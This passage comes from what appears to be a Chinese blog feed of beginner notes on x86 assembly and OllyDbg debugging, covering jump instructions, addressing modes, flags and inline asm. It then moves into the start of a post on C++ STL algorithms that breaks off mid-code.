printf(&quot;未跳转\\n&quot;);end:​ printf(&quot;跳转\\n&quot;);​ printf(&quot;end\\n&quot;);getchar();00401004 |. 68 F4204000 PUSH JNE_JNZ.004020F4 ; /format = &quot;begin\\n&quot;00401009 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040100F |. 83C4 04 ADD ESP,400401012 |. C745 FC 04000&gt;MOV DWORD PTR SS:[EBP-4],4 ; a=400401019 |. B8 03000000 MOV EAX,3 ; eax=30040101E |. 2B45 FC SUB EAX,DWORD PTR SS:[EBP-4] ; 3-4 cmp eax,[ebp-4]00401021 |. 74 0E JE SHORT JNE_JNZ.0040103100401023 |. 68 FC204000 PUSH JNE_JNZ.004020FC ; /format = &quot;未跳转&quot;00401028 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040102E |. 83C4 04 ADD ESP,400401031 |&gt; 68 04214000 PUSH JNE_JNZ.00402104 ; /format = &quot;跳转&quot;00401036 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040103C |. 83C4 04 ADD ESP,40040103F |. 68 0C214000 PUSH JNE_JNZ.0040210C ; /format = &quot;end\\n&quot;00401044 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040104A |. 83C4 04 ADD ESP,40040104D |. FF15 9C204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.getchar&gt;] ; MSVCR90.getchar 知识点： 无条件跳转指令jmp goto指令 优化后的指令 一、GOTO与JMP 无条件跳转指令 格式: JMP A 其中A为转移的目的地址。程序转移到目的地址所指向的指令继续往下执行。 // JZ/JE JNZ/JNE 都需要一个条件，条件成立才跳转，而jmp不需要。 本组指令对标志位无影响. 3、代码测试 12345678910111213//goto jmp​ printf(&quot;begin\\n&quot;);​ goto end; printf(&quot;do this&quot;);end:​ printf(&quot;end\\n&quot;);getchar(); 二、优化后的指令 /0d 禁用优化 /01 最小化大小 /02 最大化速度 /0x 完全优化 优化功能对嵌入汇编代码的程序无效 撤销对汇编指令更改 ALT+BACKSPACE键 知识点： 条件转移指令 JNGE 条件转移指令 JL 一、指令格式 条件转移指令 JL/JNGE 格式: JL/JNGE 标号地址 功能: 小于/不大于等于时转移 标号地址 JNGE 有符号 不大于等于 则跳转 //Jump if Not Greater or Equal JL 有符号 小于 则跳转 //Jump if Less SF=1; 符号标志位为1 则跳转到标号地址执行 二、代码测试 12345678910111213141516171819202122232425262728293031323334353637 printf(&quot;begin\\n&quot;);​ //&gt;=​ int a=0xA;​ int b=0x20;​ //if (a&gt;=b) //jl​ //&#123;​ // printf(&quot;do this&quot;);​ //&#125;​ __asm ​ &#123;​ mov ebx,b​ sub a,ebx​ jnge end​ mov ebx,ebx​ jl end​ &#125;​ //&lt; end:​ printf(&quot;end\\n&quot;); 知识点： 条件转移指令 JLE 条件转移指令 JNG 一、指令格式 条件转移指令 JLE/JNG 格式: JLE/JNG 标号地址 功能: 小于等于/不大于 时转到标号地址 JNG 有符号 不大于 则跳转 //Jump if Not Greater JLE 有符号 小于等于 则跳转 //Jump if Less or Equal SF=1,ZF=1,OF=1 //其中一个或者多个为1 则跳转 二、代码测试 1234567891011121314151617181920212223 &#123;​ printf(&quot;begin\\n&quot;);​ int a=3;​ int b=5;​ if (a&gt;b) //JLE/JNG 小于等于/不大于时转移​ &#123;​ printf(&quot;do this&quot;);​ &#125; //JNG 不大于​ printf(&quot;end;\\n&quot;);​ return 0;&#125; OD ctrl+* 设置下一条要执行指令的地址 简单的说就是设置EIP JNC 指令：Jump Not Carry 没进位时跳转 //CF=0 JC ;进位则跳转 CF=1 知识点： 条件转移指令 JG（&gt; 时转移) 条件转移指令 JNLE(&lt;=时不转移) 条件转移指令 JGE(&gt;=时转移) 条件转移指令JNL(&lt;时不转移) 一、指令格式 1234JG/JNLE 标号地址 不&lt;= //大于 &gt; // ZF=0 &amp;&amp; SF=0 &amp;&amp; OF=0JGE/JNL 标号地址 不&lt; //大于等于 &gt;= ZF=1 || SF=0 || OF=0时跳转 JG : Jump if Greater // &gt; 跳 JNLE:Jump if Not Less or Equal //不&lt;= 跳 JGE :Jump if Greater or Equal // &gt;= 跳 JNL: Jump if Not Less //不&lt; 跳 二、代码测试 12345678910111213141516171819202122232425262728293031323334353637 printf(&quot;begin\\n&quot;);​ int a=4;​ //if (a&lt;=3)​ //if (!(a&gt;3))​ // ​ //&#123;​ // printf(&quot;小于等于&quot;);​ //&#125;//大于时跳转//不小于等于跳转 ​ __asm​ &#123;​ cmp a,3​ JNLE end //JG end​ &#125;​ printf(&quot;do this\\n&quot;);​ printf(&quot;小于等于&quot;);end:​ printf(&quot;end&quot;);​ return 0; 12345678910111213141516JMP //014JE/JZ //= //012 Jump if Equl JNE/JNZ //不= //013//带符号数条件转移指令JL /JNGE //不&gt;= //小于 &lt; //015JLE/JNG //不&gt; //小于等于&lt;= //016JG/JNLE //不&lt;= //大于 &gt;//017JGE/JNL //不&lt; //大于等于&gt;= //017Jump 跳转/转移Not 不Equal 相等Zero 零Less 小于Greater 大于 知识点： 12345678910111213141516171819202122二、代码测试 JE/JZ ！= 不跳转 JNZ/JNE == 不跳转 JG/JNLE &lt;= 不跳转 JGE/JNL &lt; 不跳转 JL/JNGE &gt;= 不跳转JLE/JNG &gt; 不跳转 printf(&quot;begin\\n&quot;); //unsigned int a=3,b=5; if (a!=b) //je if (a==b) //jnz if (a&lt;=b) //jg if (a&lt;b) //jge if (a&gt;=b) //jl if (a&gt;b)//jle &#123; printf(&quot;do if&quot;); &#125; printf(&quot;end&quot;);return 0; 知识点： JA （&gt; 时转移) JNBE(&lt;=时不转移) JA与JG的区别 Above 高于 Below低于 一、无符号大于转移指令JA/JNBE JA : 高于 时跳转 // &gt;时跳转 JNBE: 不低于等于 时跳转 //&lt;=时不跳转 ​ CF(进位标志位)：当执行一个加法（减法）运算时，最高位产生进位（或借位）时，CF为1，否则为0。 ​ ZF零标志位：若当前的运算结果为零，则ZF为1，否则为0。 JA与JG区别： JG是带符号数比较 &gt; JA是无符号数比较 &gt; 二、代码测试 1234567891011121314151617 //**CF(进位标志位)**​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2&lt;=b2)//无符号的生成JA 不够减 借位​ if (a&lt;=b) ///&lt;=时不跳转&gt;时跳转带符号的生成JG指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125; 知识点： JNB （不小于) JAE (高于等于) JNC （CF！=1） JNB与JGE的区别 一、无符号大于转移指令JA/JNBE JNB : 低于 时不跳转 //&gt;=时跳转 //OD JAE: 高于等于 时跳转 //&gt;=时跳转 JNC ：Jump Not Carry 没进位时跳转 //CF=0 JA与JG区别： JNB 是带符号数比较 &gt;= JGE 是无符号数比较 &gt;= 二、代码测试 12345678910111213141516171819 //CF(进位标志位)​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2&lt;b2)//无符号的生成JAE JNB 不够减借位​ if (a&lt;b) ///&lt;时不跳转&gt;时跳转带符号的生成JGE JNL指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125; 知识点： JB/JNAE/JC &lt;指令 与JL/JNGE区别 一、无符号大于转移指令JB/JNAE/JC JB 低于 时跳转 //&lt; 时跳转 //OD JNAE: 高于等于 时不跳转 //**&gt;=**时不跳转 JC ：Jump Carry 进位时跳转 //CF=1 JB与JL区别： JB 是带符号数比较 &gt;= JL 是无符号数比较 &gt;= 二、代码测试 ​ 1234567891011121314151617//CF(进位标志位)​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2**&gt;=** b2)//无符号的生成JAE JNB 不够减借位​ if (a**&gt;=** b) ///&lt;时不跳转&gt;时跳转带符号的生成JGE JNL指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125; 知识点： JBE/JNA &lt;=指令 与JLE/JNG区别 一、无符号大于转移指令JBE/JNA JBE: 低于等于 时跳转 // &lt;=时跳转 //OD **JNA: 高于 时不跳转 //&gt; 不跳转 ** JBE与JLE区别： JLE 是带符号数比较 &gt;= JBE 是无符号数比较 &gt;= 二、代码测试 12345678910111213141516171819 //CF(进位标志位)​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2&gt;=b2)//无符号的生成JAE JNB 不够减借位​ if (a&gt;= b) ///&lt;时不跳转&gt;时跳转带符号的生成JGE JNL指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125;","categories":[{"name":"汇编逆向","slug":"汇编逆向","permalink":"https://xiaowuyoucy.github.io/categories/汇编逆向/"}],"tags":[]},{"title":"1-12","slug":"hbnx001-1-12","date":"2021-07-12T15:22:37.000Z","updated":"2021-07-24T18:43:27.211Z","comments":true,"path":"2021/07/12/hbnx001-1-12/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/12/hbnx001-1-12/","excerpt":"","text":"OD 按下F2断点/关闭断点 跳到被调用的地方的下一条语句 按下回车会鼠标右键选择反汇编窗口中跟随 定位到指定API函数的地方 按下Ctrl + G 或 鼠标右键选择转到-&gt;表达式 或者输入命令 bp api函数名 查看所有断点 按下 ALT + B 或 鼠标点击菜单栏 查看-&gt;断点 将OD添加到鼠标右键菜单栏 OD断点历史记录文件夹 c或c++内联汇编 12345678910111213141516171819// 001_MOV.cpp : 定义控制台应用程序的入口点。//#include&lt;iostream&gt;#include &lt;Windows.h&gt;int aaa = 1;int main(int argc, TCHAR* argv[])&#123; MessageBoxW(0, NULL, NULL, MB_OK); aaa = 0x889977;//MOV DWORD PTR DS:[0x403018],0x889977 __asm &#123; mov aaa, 0x889977 &#125; __asm mov aaa, 0x889977; MessageBoxW(0, NULL, NULL, MB_OK); return 0;&#125; MOV指令 aaa=0x889977; MOV DWORD PTR DS:[0x403018],0x889977 dword 双字 就是四个字节 ptr pointer缩写 即指针 []里的数据是一个地址值 dd指令 查看数据的指令 dd 地址 dd 0x403018 == dd 403018 知识点： 函数与CALL 关闭C/C++优化 单步步过 单步步入 一、函数与CALL 1234567891011121314151617181920212223int add(int a,int b)&#123; return a+b;&#125;00401030 |. 8105 18304000&gt;ADD DWORD PTR DS:[403018],88 ; add 加法指令未被优化00401040 |. 68 88000000 PUSH 8800401045 |. A1 18304000 MOV EAX,DWORD PTR DS:[403018]0040104A |. 50 PUSH EAX0040104B |. E8 B0FFFFFF CALL 001_MOV.00401000 ; add函数00401050 |. 83C4 08 ADD ESP,800401053 |. A3 18304000 MOV DWORD PTR DS:[403018],EAX 二、关闭C/C++优化 项目配置属性—&gt; C/C++ —&gt;优化—&gt;禁用/Od 三、单步步入：(进CALL) F9(运行): 如果断下后，要继续让程序运行起来，可以用快捷键 F7(单步步入):按下后执行下一条指令。如果有CALL则进入。 四、单步步过：(不进CALL) F8(单步步过):按下后执行下一条指令。不会进入子函数CALL里边，子函数CALL也被当成一条指令。 这两个单步执行操作的主要区别在于：如果当前的命令是一个子函数，按，将会进入子函数，并停在子函数的第一条命令上；而按，将会一次运行完这个子函数。如果您单步步过的子函数中含有断点或其他调试事件，执行将会被暂停 知识点： 立即寻址 寄存器寻址 寄存器间接寻址 直接寻址方式 直接寻址方式 寄存器相对寻址 一、了解指令常用寻址方式 寻址方式就是寻找操作数或操作数地址的方式。 寄存器是中央处理器内的组成部分。寄存器是一组容量有限的高速存贮部件，它们可用来暂存指令、数据和位址。（DWORD） 1234567891011MOV EAX，0x1234 //立即寻址 MOV EAX，EBX //寄存器寻址 数据寄存器,一般称之为通用寄存器组 通用寄存器有4个 EAX,EBX,ECX,EDX MOV EAX，[EBX] //寄存器间接寻址 MOV EAX，v //v是一个变量名 MOV EAX，[1234] //直接寻址方式 MOV EAX，[EBX+1234] //寄存器相对寻址 二、理解寻址 上边的名字看起来很多，总结起来也就2种方式： 带[]与不带[] 1、不带括号的 有立即数与寄存器 2、带括号的就是指针，从地址里边取值出来。 1234567891011MOV EAX，0x1234 //立即寻址 eax=0x1234; MOV EAX，EBX //寄存器寻址 eax=ebx MOV EAX，[EBX] //寄存器间接寻址 eax=*(int*)ebx; MOV EAX，v //v是一个变量名 eax=v; //被编译后 一般会呈后边两种形式MOV EAX，[1234] //直接寻址方式 eax=*(int*)(0x1234)MOV EAX，[EBX+1234] // 寄存器相对寻址 eax=*(int*)((int)ebx+1234); //这里的1234称为偏移，EBX是基址 三、对调位置 12345678910111213MOV EAX，0x1234 //立即数不能出现在MOV指令左边。如： MOV 0x1234,EAX 这是错的写法 后边的都可以对换位置 MOV EAX，EBX //寄存器寻址 eax=ebx mov ebx,eax MOV EAX，[EBX] //寄存器间接寻址 eax=*(int*)ebx; mov [ebx],eax MOV EAX，v //v是一个变量名 eax=v; mov v,eaxMOV EAX，[1234] //直接寻址方式 eax=*(int*)(0x1234) mov [1234],eaxMOV EAX，[EBX+1234] // 寄存器相对寻址 eax=*(int*)((int)ebx+1234) mov [ebx+1234],eax 四、代码测试 int *da=a;//int a[0x10]={0,1,2,3,4,5,6,7,8,9,0xA,0xB,0xC,0xd,0xe}; //提示 在命令栏中用 dd 地址表达式 可以以DWORD 4字节格式显示指定地址的数据 1234567891011121314151617__asm&#123;mov eax,0x1111 mov ebx,eaxmov ebx,bbb //全局变量bbb mov ebx,da //取数组基址 mov eax,[da+4] mov eax,[ebx+4]&#125; 123456789101112131415//下边指令，前边是寄存器相对寻址，后边是立即寻址0040105A |. C745 FC 20304&gt;MOV DWORD PTR SS:[EBP-4],001_MOV.00403020 ; int *da=a //a是数组的地址 00401061 |. B8 11110000 MOV EAX,1111 ; eax=0x1111 立即寻址00401066 |. 8BD8 MOV EBX,EAX ; mov ebx,0x1111--&gt;ebx=0x1111 //寄存器寻址00401068 |. 8B1D 18304000 MOV EBX,DWORD PTR DS:[403018] ; mov ebx,008899FF--&gt;ebx=009988FF 直接寻址0040106E |. 8B5D FC MOV EBX,DWORD PTR SS:[EBP-4] ; mov ebx,da 寄存器 相对寻址00401071 |. 8B45 00 MOV EAX,DWORD PTR SS:[EBP] //寄存器间接寻址00401074 |. 8B43 04 MOV EAX,DWORD PTR DS:[EBX+4] ; eax=da[1]=1 寄存器 相对寻址 dd命令 12345dd eax + 2 * 8dd eaxdd 0x11111 定位到指定地址 知识点： 加法汇编指令ADD 一、加法指令 ADD(Addition) 格式 格式: ADD A,B //A=A+B; 功能: 两数相加 OPRD1为任一通用寄存器或存储器操作数,可以是任意一个通用寄存器,而且还可以是任意一个存储器操作数. OPRD2为立即数,也可以是任意一个通用寄存器操作数.立即数只能用于源操作数B. A和B均为寄存器是允许的,一个为寄存器而另一个为存储器也是允许的, 但不允许两个都是存储器操作数. //也就是说A与B不能同时是指针 如: add [eax],[ebx] 这类情况是错的 例子： 第三课中的add函数里 有如下2句代码 12300401003 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8] ; a00401006 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C] ; b //eax=a+b 二、ADD指令测试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int _tmain(int argc, _TCHAR* argv[])&#123; int i=0; printf(&quot;&quot;); i=i+0x100; i=i+0x111; int *p=&amp;i; __asm &#123; mov eax,0x222 mov ebx,0x100 add ebx,eax //ebx322 // mov ebx,p add [ebx],0x111//00401048 |. 8003 11 ADD BYTE PTR DS:[EBX],11 ; i=i+11 add i,0x111 //DWORD WORD &#125; /* 0040101C |. 8B45 F8 MOV EAX,DWORD PTR SS:[EBP-8] ; eax=i=0 0040101F |. 05 00010000 ADD EAX,100 ; eax=eax+100=0+100=100 00401024 |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX ; i=eax=100 00401027 |. 8B4D F8 MOV ECX,DWORD PTR SS:[EBP-8] ; ecx=i=100 0040102A |. 81C1 11010000 ADD ECX,111 ; ecx=ecx+111=100+111=0x211 00401030 |. 894D F8 MOV DWORD PTR SS:[EBP-8],ECX ; i=ecx=0x211 00401033 |. 8D55 F8 LEA EDX,DWORD PTR SS:[EBP-8] ; edx=&amp;i=ebp-8; 00401036 |. 8955 FC MOV DWORD PTR SS:[EBP-4],EDX ; p=&amp;i 00401039 |. B8 22020000 MOV EAX,222 0040103E |. BB 00010000 MOV EBX,100 00401043 |. 03D8 ADD EBX,EAX ; ebx=ebx+eax=100+222=322 00401045 |. 8B5D FC MOV EBX,DWORD PTR SS:[EBP-4] ; ebx=i=edx=ebp-8 00401048 |. 8003 11 ADD BYTE PTR DS:[EBX],11 ; i=i+11 0040104B |. 8145 F8 11010&gt;ADD DWORD PTR SS:[EBP-8],111 ; i=i+111 */ printf(&quot;&quot;); return 0;&#125; OD按下-号可以返回上一步 知识点： 十六进制 字节，字，双字 汇编中的内存单元长度修饰 add [ebx],0x111 //00401048 |. 8003 11 ADD BYTE PTR DS:[EBX],11 ; i=i+11 一、十六进制 十六进制同我们日常中的十进制表示法不一样。它由0-9,A-F,组成。与10进制的对应关系是：0-9对应0-9;A-F对应10-15; 十进制元素(0,1,2,3,4,5,6,7,8,9) 十六进制元素(0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F) 9+1=10; //十进制 A F+1=10; //十六进制 99+1=100;//十进制 0x64 FF+1=100;//十六进制 11616=256 //0xBDA=111616+13*16+10 十六进制一般会加上前缀0x 汇编中也可以加上h后缀 //想一想 十六进制中 0x0F+2=0x11 0xF9+1=0xFA 0x10+1=0x11 0x18+8=0x20 8+9=0x11 二、字节，字，双字 字节 (1字节):BYTE类型 ( unsigned char) 0-255 表示成16进制0–0xFF 字 (2字节):WORD类型 (unsigned short) 0-65535， 表示成16进制0–0xFFFF 双字 (4字节):DWORD类型(unsigned long) 0-4294967295 表示成16进制0–0xFFFFFFFF 四字(8字节) QWORD 类型 (unsigned long long ) 64 位整数，Q 代表四（字） 三、汇编中的内存单元长度修饰 1、自动加上修饰前缀规律 后面是寄存器会自动加上前缀修饰符 12345678910111213141516171819 int pb=3; mov [eax],ebx mov edx,[ecx] mov ebx,pbBYTE c=3;WORD w=4;DWORD dw=5;mov c,0x87654321mov w,0x87654321mov dw,0x87654321 2、必须手动添加内存单元长度修饰的情况 前边是存储器，后边是常量的情况，需要手动添加长度修饰 1234567891011121314151617181920212223242526272829303132333435363738394041add [ebx],0x111 //特殊... 因为编译器不知道具体长度，会默认为 字节长度mov byte ptr [ebx],0x87654321mov word ptr [ebx],0x87654321mov dword ptr [ebx],0x87654321 BYTE c=3; WORD w=4; DWORD dw=5; __asm &#123; add c,0x87654321 // mov [ebp-??],0x21 add w,0x87654321 add dw,0x87654321 /* 自动添加的长度修饰符 00401071 |. 8045 EF 21 ADD BYTE PTR SS:[EBP-11],21 ; c=21 00401075 |. 66:8145 FC 21&gt;ADD WORD PTR SS:[EBP-4],4321 ; w=4321 0040107B |. 8145 F0 21436&gt;ADD DWORD PTR SS:[EBP-10],87654321 ; dw=87654321 */ &#125; 知识点： 寄存器EAX 寄存器AX 寄存器AH 寄存器AL 一、EAX与AX,AH,AL关系图 EAX，EBX，ECX，EDX都有低16位和低8位，高8位寄存器 ESP，EBP，ESI，EDI只有低16位寄存器例如 SP,BP,SI,DI，而没有低8位和高8位 数据查看命令 dd 查看DWORD内存 dw 查看WORD内存 db 查看BYTE内存 一格表示一字节 二、代码测试 1、OD命令栏 ？号指令 （用计显示表达式的值) ? ax 查看ax的值 ? eax 查看eax的值 ? al 查看al的值 ? ah查看ah的值 123456789101112131415161718192021222324252627282930313233 printf(&quot;&quot;); int i_AX,i_AH,i_AL; __asm &#123; mov eax,0x87654321 ; mov word ptr [i_AX],ax mov byte ptr [i_AH],ah mov byte ptr [i_AL],al &#125;#include &lt;Windows.h&gt;int _tmain(int argc, _TCHAR* argv[])&#123; DWORD iEax; WORD iAx; BYTE iAh,iAl; printf(&quot;\\n&quot;); __asm &#123; mov eax,0x87654321 mov iEax,eax mov iAx,ax mov iAh,ah mov iAl,al &#125; printf(&quot;EAX=%x,AX=%x,AH=%x,AL=%x \\n&quot;,iEax,iAx,iAh,iAl); getchar(); return 0;&#125; 知识点： MOVSX符号扩展传送 MOVZX零扩展传送 一、MOVSX与MOVZX格式 MOVSX 操作数A ，操作数B MOVZX 操作数A ，操作数B 相同点：操作数B 空间必须小于 操作数A 1、格式与MOV基本相同 2、能完成小存储单元向大存储单元的数据传送 比如 movsx eax,bx movzx ebx,ax movsx eax,bx 正确语法: 1234MOVSX EAX,AXMOVSX EBX,BLMOVZX EDX,DXMOVZX EDX,DL 错误写法: 12MOVSX EAX,EAX //第二个操作数内存等于第一个操作数MOVSX AX,EAX //第二个操作数内存大于第一个操作数 MOVSX，MOVZX 与MOV指令区别： 1、MOVSX，MOVZX的操作数B所占空间必须小于操作数A. 2、MOV指令是原值传送，不会改动。而MOVSX与MOVZX有可能会改动 MOVSX与MOVZX的区别： 1、MOVSX将用操作数B的符号位扩展填充操作数A的余下空间，如果是负数则符号位为1，如果是正数则和MOVZX功能相同 2、MOVZX将用0来扩展填充操作数A的余下空间。 操作数A 操作数B 二、代码测试 1234567891011 int i=0x888; char ci=-100; printf(&quot;\\n&quot;); i=ci; //111111111111111111111111 11001101 i=(unsigned char)ci; // 11001101printf(&quot;&quot;); 判断有符号十六进制是正数还是负数 char 0-FF //FF/2 DWORD 0-0xFFF 8F8F 最高为大于等于8的是负数,1至7是正数 OD按下F4键可以运行到鼠标指定的指令,前提是程序必须会经过这条指令 知识点： LEA指令 &amp;与LEA OD里修改汇编代码 在指定的指令位置按下空格键或 一、LEA指令格式 有效地址传送指令 LEA 格式: LEA 操作数A, 操作数B 功能: 将操作数B的有效地址传送到指定的的某个寄存器，操作数A必须是寄存器。(32位系统上就是32位寄存器) 不能两个操作数都是内存操作的 12错误写法LEA DWORD PTR DS:[EBX],DWORD PTR DS:[0X123456] 二、C++代码测试 123int i;int *p=&amp;i; 三、OD里修改汇编代码 按下空格后 直接输入汇编代码 四、汇编代码测试 123456789101112131415int i=0:char a[4]=&#123;0&#125;;__asm&#123; lea ebx,i // ebx=&amp;i mov dword ptr [ebx],0x113388 mov i,0x776628&#125; 知识点： OD调试 命令栏指令 一、OD调试 重新开始：Ctrl+F2 转到地址：CTRL+G 断点切换: F2 断点窗口: Alt+B 运行 : F9 暂停 : F12 单步步过: F8 //遇到CALL跳过 单步步入: F7 //遇到CALL进入 运行到选定位置 :F4 //这个主菜单上没有，右键菜单-断点-F4 反汇编窗口中跟随 :回车键enter 跟随: 回车键enter //进入某个地址 执行到返回 CTRL + F9 右键菜单–转到 +号：转到下一步 //Plus -号：转到上一步 //Minus *号：转到当前指令地址 //EIP 寄存器窗口: 二、命令栏指令 bp 下断点 bc 清除断点 dd 以双字方式显示数据 dw 以字方式显示数据 db 以字节方式显示数据 ？ 计算表达式的值 知识点： 汇编减法指令sub 初识标志位 标志寄存器PSW ZF（零标志） 一、标志寄存器PSW 标志寄存器PSW(程序状态字寄存器PSW) 标志寄存器PSW是一个16为的寄存器。它反映了CPU运算的状态特征并且存放某些控制标志。8086使用了16位中的9位，包括6个状态标志位和3个控制标志位。 CF(进位标志位)：当执行一个加法（减法）运算时，最高位产生进位（或借位）时，CF为1，否则为0。 ZF零标志位：若当前的运算结果为零，则ZF为1，否则为0。 SF符号标志位：该标志位与运算结果的最高位相同。即运算结果为负，则SF为1，否则为0。 OF溢出标志位：若运算结果超出机器能够表示的范围称为溢出，此时OF为1，否则为0。判断是否溢出的方法是：进行二进制运算时，最高位的进位值与次高位的进位值进行异或运算，若运算结果为1则表示溢出OF=1，否则OF=0 PF奇偶标志：当运算结果的最低16位中含1的个数为偶数则PF=1否则PF=0 AF辅助进位标志：一个加法（减法）运算结果的低4位向高4位有进位（或借位）时则AF=1否则AF=0 另外还有三个控制标志位用来控制CPU的操作，可以由程序进行置位和复位。 TF跟踪标志：该标志位为方面程序调试而设置。若TF=1，8086/8088CPU处于单步工作方式，即在每条指令执行结束后，产生中断。 IF中断标志位：该标志位用来控制CPU是否响应可屏蔽中断。若IF=1则允许中断，否则禁止中断。 DF方向标志：该标志位用来控制串处理指令的处理方向。若DF=1则串处理过程中地址自动递减，否则自动递增。 OD里能查看到除IF标志外的 8个标志位 二、SUB指令 减法指令SUB (SUBtract) 格式: SUB A,B //A=A-B; 功能: 两个操作数的相减,即从A中减去B,其结果放在A中. SUB指令会影响标志位 如果SUB EAX,EBX 等于0的话,ZF标志位会置为1,说明两数相等 知识点： 比较指令CMP 条件跳转指令JZ ZF（零标志） CMP 和JZ 指令 比较指令CMP 格式: CMP A,B // A-B; 功能: 两个操作数的相减,即从A中减去B，其结果会影响标志位， 对标志位的影响与SUB指令相同。本条指令主要是用于配合条件转移指令使用。如JZ ZF=0时，跳转 条件转移指令 JE/JZ 格式: JE/JZ标号 //等于跳转 功能: ZF＝1,转到指定地址执行 说明: 指令JE与JZ等价,它们是根据标志位ZF进行转移的指令 JE,JZ均为一条指令的两种助记符表示方法 12345678910111213 printf(&quot;begin\\n&quot;); int a=3; if (a!=3) &#123; printf(&quot;do code\\n&quot;); &#125;printf(&quot;end&quot;);","categories":[{"name":"汇编逆向","slug":"汇编逆向","permalink":"https://xiaowuyoucy.github.io/categories/汇编逆向/"}],"tags":[]},{"title":"算法","slug":"cpp0088-算法","date":"2021-07-05T10:16:24.000Z","updated":"2021-12-28T18:40:15.393Z","comments":true,"path":"2021/07/05/cpp0088-算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0088-算法/","excerpt":"","text":"算法 算法基础 算法概述 算法部分主要由头文件&lt;algorithm&gt;，&lt;numeric&gt;和&lt;functional&gt;组成。 &lt;algorithm&gt;是所有STL头文件中最大的一个，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、反转、排序、合并等等。 &lt;numeric&gt;体积很小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。 &lt;functional&gt;中则定义了一些模板类，用以声明函数对象。 STL提供了大量实现算法的模版函数，只要我们熟悉了STL之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要的功能，从而大大地提升效率。 #include &lt;algorithm&gt; #include &lt;numeric&gt; #include &lt;functional&gt; STL中算法分类 操作对象 直接改变容器的内容 将原容器的内容复制一份,修改其副本,然后传回该副本 功能: 非可变序列算法 指不直接修改其所操作的容器内容的算法 计数算法 count、count_if 搜索算法 search、find、find_if、find_first_of、… 比较算法 equal、mismatch、lexicographical_compare 可变序列算法 指可以修改它们所操作的容器内容的算法 删除算法 remove、remove_if、remove_copy、… 修改算法 for_each、transform 排序算法 sort、stable_sort、partial_sort、 排序算法 包括对序列进行排序和合并的算法、搜索算法以及有序序列上的集合操作 数值算法 对容器内容进行数值计算 常用算法汇总 常用的查找算法： adjacent_find()（ adjacent 是邻近的意思）,binary_search(),count(), count_if(),equal_range(),find(),find_if()。 常用的排序算法： merge(),sort(),random_shuffle()（shuffle是洗牌的意思） ,reverse()。 常用的拷贝和替换算法： copy(), replace(), replace_if(),swap() 常用的算术和生成算法： accumulate()（ accumulate 是求和的意思）,fill(),。 常用的集合算法： set_union(),set_intersection(), set_difference()。 常用的遍历算法： for_each(), transform()（ transform 是变换的意思） 算法中函数对象和谓词 函数对象和谓词定义 函数对象： 重载函数调用操作符的类，其对象常称为函数对象（function object），即它们是行为类似函数的对象。一个类对象，表现出一个函数的特征，就是通过“对象名+(参数列表)”的方式使用一个类对象，如果没有上下文，完全可以把它看作一个函数对待。 这是通过重载类的operator()来实现的。 “在标准库中，函数对象被广泛地使用以获得弹性”，标准库中的很多算法都可以使用函数对象或者函数来作为自定的回调行为； 谓词： 一元函数对象：函数参数1个； 二元函数对象：函数参数2个； 一元谓词 函数参数1个，函数返回值是bool类型，可以作为一个判断式 ​ 谓词可以使一个仿函数，也可以是一个回调函数。 二元谓词 函数参数2个，函数返回值是bool类型 一元谓词函数举例如下 1，判断给出的string对象的长度是否小于6 1234567bool GT6(const string &amp;s)&#123;return s.size() &gt;= 6;&#125; 2,判断给出的int是否在3到8之间 1234567bool Compare( int i )&#123;return ( i &gt;= 3 &amp;&amp; i &lt;= 8 );&#125; 二元谓词举例如下 1，比较两个string对象，返回一个bool值，指出第一个string是否比第二个短 1234567bool isShorter(const string &amp;s1, const string &amp;s2)&#123;return s1.size() &lt; s2.size();&#125; 一元函数对象案例 12345678910111213141516171819202122232425262728293031323334353637383940414243//1普通类 重载 函数调用操作符template &lt;typename T&gt;void FuncShowElemt(T &amp;t) //普通函数 不能像 仿函数那样记录状态&#123; cout &lt;&lt; t &lt;&lt; &quot; &quot;;&#125;;void showChar(char &amp;t)&#123; cout &lt;&lt; t &lt;&lt; &quot; &quot;;&#125;//函数模板 重载 函数调用操作符template &lt;typename T&gt;class ShowElemt&#123;public: ShowElemt() &#123; n = 0; &#125; void operator()(T &amp;t) &#123; n++; cout &lt;&lt; t &lt;&lt; &quot; &quot;; &#125; void printCount() &#123; cout &lt;&lt; n &lt;&lt; endl; &#125;public: int n;&#125;;//1 函数对象 基本使用void main11()&#123; int a = 100; FuncShowElemt&lt;int&gt;(a); //普通的函数调用 ShowElemt&lt;int&gt; showElemt; //函数对象 showElemt(a); //函数对象调用 &#125; 一元谓词案例 1234567891011121314151617181920212223242526272829303132333435//1元谓词 例子template &lt;typename T&gt;class Isdiv&#123;public: Isdiv(const T &amp;divisor) // &#123; this-&gt;divisor = divisor; &#125; bool operator()(T &amp;t) &#123; return (t%divisor == 0); &#125;protected:private: T divisor;&#125;;void main13()&#123; vector&lt;int&gt; v2; for (int i=10; i&lt;33; i++) &#123; 